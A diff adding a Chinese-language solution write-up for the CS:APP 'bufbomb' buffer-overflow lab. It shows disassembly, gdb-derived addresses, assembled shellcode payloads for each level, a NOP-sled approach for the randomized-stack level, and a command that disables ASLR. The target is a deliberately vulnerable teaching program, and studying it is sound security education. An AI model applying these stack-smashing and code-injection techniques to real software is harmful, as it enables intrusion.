@@ -1,0 +1,183 @@
+IA32-Version:
+    linux默认开启ASLR,每次加载程序,变量地址都会不一样:
+    sysctl -w kernel.randomize_va_space=0（赋值为2，即可打开ASLR）
+
+    不过本实验的程序似乎经过特殊处理,不需要关闭ASLR
+    
+    正常编译的程序的stack是non-executable的,但是加一个编译选项就可以打开
+    本实验的程序应该都打开了executable选项了
+
+Level0:
+    修改getbuf()的返回地址,让程序执行smoke
+    打开gdb,设置断点至getbuf, r -u cheukyin
+
+     80491f4:	55                   	push   %ebp
+     80491f5:	89 e5                	mov    %esp,%ebp
+     80491f7:	83 ec 38             	sub    $0x38,%esp
+     80491fa:	8d 45 d8             	lea    -0x28(%ebp),%eax
+     80491fd:	89 04 24             	mov    %eax,(%esp)
+     8049200:	e8 f5 fa ff ff       	call   8048cfa <Gets>
+     8049205:	b8 01 00 00 00       	mov    $0x1,%eax
+     804920a:	c9                   	leave  
+     804920b:	c3                   	ret    
+
+     以上代码标明buf的地址是ebp-0x28,地址存放在eax中
+     print $ebp+4  ==>  0x55683884
+     print eax     ==>  0x55683858
+     两者相差44个字节,因此需要输入44个普通字符,在输入smoke的地址
+     print smoke   ==>  0x8048c18
+
+     hex结果保存在level0-smoke-hex.txt
+     ./hex2raw < level0-smoke-hex.txt|./bufbomb_32 -u cheukyin 即可过关
+
+Level1:
+    跟上面类似,执行fizz(),不过fizz有一个参数需要压栈,这个参数需要跟cookie相等
+    因此除了修改getbuf返回地址,还需要输入四字节当作fizz的返回地址,再输入4字节cookie
+
+    ./makecookie cheukyin 可获取cookie
+    反汇编可获取fizz返回地址
+
+    ./hex2raw<level1-fizz-hex.txt | ./bufbomb_32 -u cheukyin 通关
+
+Level2:
+    修改全局变量global_value的值,并进入bang函数
+
+    要修改global_value,便需在stack上注入一段修改的代码,执行完get_buf后jump到该代码,
+    代码执行完后便jump到bang
+
+    level2-firecracker-assembly.S为注入代码:
+
+    # push the address of bang onto stack
+    pushl $0x08048c9d
+
+    # in gdb, print &global_value  ==>   0x804d100
+    # mov cheukyin cookie to global_value
+    mov $0x3955ae84, %eax
+    mov %eax, 0x804d100
+
+    # jump to <bang>
+    ret
+
+    先把bang地址压栈,然后修改global_value的值为cheukin的cookie,最后ret跳转至bang
+
+    gcc -m32 -c level2-firecracker-assembly.S生成目标文件 
+    objdump -d level2-firecracker-assembly.o > level2-firecracker-assembly.d反汇编
+    level2-firecracker-assembly.d:
+
+    0:	68 9d 8c 04 08       	push   $0x8048c9d
+    5:	b8 84 ae 55 39       	mov    $0x3955ae84,%eax
+    a:	a3 00 d1 04 08       	mov    %eax,0x804d100
+    f:	c3                   	ret    
+    
+    gdb: print $ebp+8  ==>  0x55683888
+    把机器码填充到上面的地址,然后把get_buf返回地址修改为上面的地址即可
+
+    ./hex2raw<level2-bang-hex.txt | ./bufbomb_32 -u cheukyin可过关
+
+
+Level3:
+    令getbuf返回cookie给test,因此不能破坏test的stack frame,
+    所以只能把注入代码写在输入字符串的开头,也就是buf地址
+
+    另外,当返回test时需要恢复正确的ebp,因此输入字符串中在返回地址之前应写入ebp:
+    在getbuf中, x/wx $ebp ==> 0x55683880
+    返回地址应是buf地址: print $ebp-0x28 ==> 0x55683858
+
+    注入代码需要把cookie移入eax,并返回正确的地址:
+
+    #in getbuf: x/wx $ebp+4 ==> 0x08048dbe
+    #push get_buf's return address
+    pushl $0x08048dbe
+
+    #return cheukyin's cookie to test
+    movl $0x3955ae84, %eax
+
+    #return to <test>
+    ret
+
+    gcc -m32 -c level3-Dynamite-assembly.S
+    objdump -d level3-Dynamite-assembly.o > level3-Dynamite-assembly.d
+    把生成的机器码填入buf
+
+    ./hex2raw<level3-Dynamite-hex.txt | ./bufbomb_32 -u cheukyin通关
+
+
+Level4:
+    最后一关的要求和上一关一致，不过需要加上-n参数运行bufbomb，
+    此时会进入testn和getbufn函数而不是test和getbuf函数。
+    与之前不同在于,为模拟真实环境具有不定数量环境变量在stack frame的上方,
+    进入getbufn时的ebp值不是固定值，
+    读取字符串缓冲区大小由32变为512，而且会调用testn函数五次，
+    意味着需要输入五次字符串并全部通过才能通过。
+
+    由于testn()的ebp值不固定，首先需要确定如何恢复该值。
+    需要注意到一个事实,esp和ebp距离是固定的.
+    由testn的汇编代码:
+    
+    8048e26:	55                   	push   %ebp
+    8048e27:	89 e5                	mov    %esp,%ebp
+    8048e29:	53                   	push   %ebx
+    8048e2a:	83 ec 24             	sub    $0x24,%esp
+    8048e2d:	e8 5e ff ff ff       	call   8048d90 <uniqueval>
+    8048e32:	89 45 f4             	mov    %eax,-0xc(%ebp)
+    8048e35:	e8 d2 03 00 00       	call   804920c <getbufn>
+    8048e3a:	89 c3                	mov    %eax,%ebx
+
+    getbufn正常返回后应回到8048e3a,此时 ebp=esp+0x28
+    因此注入代码应增加利用esp恢复ebp的语句
+    如下:
+
+    #testn's ebp is fixed
+    #read <testn>'s assembly code and calculate
+    lea 0x28(%esp), %ebp
+
+    #look into bufbomb_32.S
+    #push getbufn's return address
+    pushl $0x08048e3a
+
+    #return cheukyin's cookie to test
+    movl $0x3955ae84, %eax
+
+    #return to <testn>
+    ret
+
+    查看其机器码:
+    
+    0:	8d 6c 24 28          	lea    0x28(%esp),%ebp
+    4:	68 3a 8e 04 08       	push   $0x8048e3a
+    9:	b8 84 ae 55 39       	mov    $0x3955ae84,%eax
+    e:	c3                   	ret    
+
+    此时,还有另一个难题,ebp不固定,则getbufn中的字串数组buf地址也是不固定的.
+    如何修改getbufn返回地址来执行注入代码呢?
+
+    通过gdb查看读入getbufn内字符串buf的地址(即eax)，
+    对于同样的userid会给出一样的地址序列，
+    目测是以userid为seed的伪随机，五次运行给出的地址分别为：
+
+    0x55683678
+    0x55683698
+    0x556836c8
+    0x556835f8
+    0x55683668
+
+    根据提示采用nop sleds的技术，
+    大意是：在不清楚有效机器代码的入口地址时，
+    可以在有效机器代码前以大量的nop机器指令(0x90)填充，
+    只要跳转地址处于这些nop上就能到达有效机器代码。
+    由于栈上的机器代码是按地址由低向高顺序执行，
+    要保证五次运行都能顺利执行有效机器代码，
+    需要满足：跳转地址位于有效机器代码入口地址之前的nop机器指令填充区。
+    这要求尽可能增大nop填充区，尽可能使有效机器代码段往后挪。
+
+    因此返回地址选用最高的地址: 0x556836c8
+
+    由getbufn汇编代码
+    8049215:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
+    可知buf地址和存放返回地址的单元相隔 0x208+4 = 0x20c 个字节
+
+    而注入代码共15个字节,因此共需要在buf开头填充 0x20c-15 个nop(0x90)
+    然后在填入机器码和返回地址
+
+    ./hex2raw -n <level4-Nitroglycerin-hex.txt|./bufbomb_32 -u cheukyin -n 通关
+    ./hex2raw 的 -n 选项可让hex2raw重复多次输入
